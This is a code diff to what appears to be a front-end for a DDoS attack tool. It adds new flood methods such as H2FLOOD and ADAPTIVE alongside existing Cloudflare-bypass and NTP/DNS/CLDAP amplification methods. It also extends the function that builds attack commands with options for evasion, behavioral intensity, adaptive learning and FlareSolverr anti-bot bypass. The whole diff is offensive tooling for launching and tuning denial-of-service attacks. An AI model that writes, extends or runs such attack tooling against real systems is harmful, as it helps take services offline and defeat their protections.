@@ -59,7 +59,7 @@ LAYER7: set[str] = {
     "BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
     "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
     "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
-    "IMPERSONATE", "HTTP3", "BROWSER", "HYBRID", "BEHAVIOR"
+    "IMPERSONATE", "HTTP3", "BROWSER", "HYBRID", "BEHAVIOR", "H2FLOOD", "ADAPTIVE"
 }
 
 LAYER4_AMP: set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}
@@ -489,7 +489,7 @@ def build_attack_command(params: AttackParams) -> list[str]:
             params.reflector if params.reflector else "reflector.txt"
         ])
     elif params.method in LAYER4_NORMAL:
-        if proxy_list_arg and proxy_list_arg.strip() != "":
+        if proxy_list_arg and proxy_list_arg.strip() != "" and proxy_list_arg.strip().lower() != "none":
             command.extend([
                 str(params.threads), 
                 str(params.duration), 
@@ -509,14 +509,15 @@ def build_attack_command(params: AttackParams) -> list[str]:
         command.append("--autoscale")
     if params.evasion:
         command.append("--evasion")
+    if params.behavioral_intensity is not None and params.behavioral_intensity >= 0:
         command.extend(["--intensity", str(params.behavioral_intensity)])
 
     # Always pass --debug so backend emits verbose diagnostics for GUI terminal filtering
     command.append("--debug")
 
     # New Bypass Parameters
-    if not params.adaptive_learning:
-        command.extend(["--adaptive", "false"])
+    if params.adaptive_learning is not None:
+        command.extend(["--adaptive", "true" if params.adaptive_learning else "false"])
     if params.flaresolverr_url:
         command.extend(["--flaresolverr", params.flaresolverr_url])
     if params.engine_sequence:
@@ -540,6 +541,7 @@ def _parse_numeric(s: str) -> float:
     s = s.strip().replace(',', '')
     SUFFIXES: list[tuple[str, float]] = [
         ('GB/s', 1_073_741_824.0), ('MB/s', 1_048_576.0), ('kB/s', 1_024.0), ('B/s', 1.0),
+        ('GB', 1_073_741_824.0), ('MB', 1_048_576.0), ('kB', 1_024.0), ('B', 1.0),
         ('G/s', 1_000_000_000.0), ('M/s', 1_000_000.0), ('k/s', 1_000.0),
         ('ms', 1.0), ('G', 1_000_000_000.0), ('M', 1_000_000.0), ('k', 1_000.0),
     ]
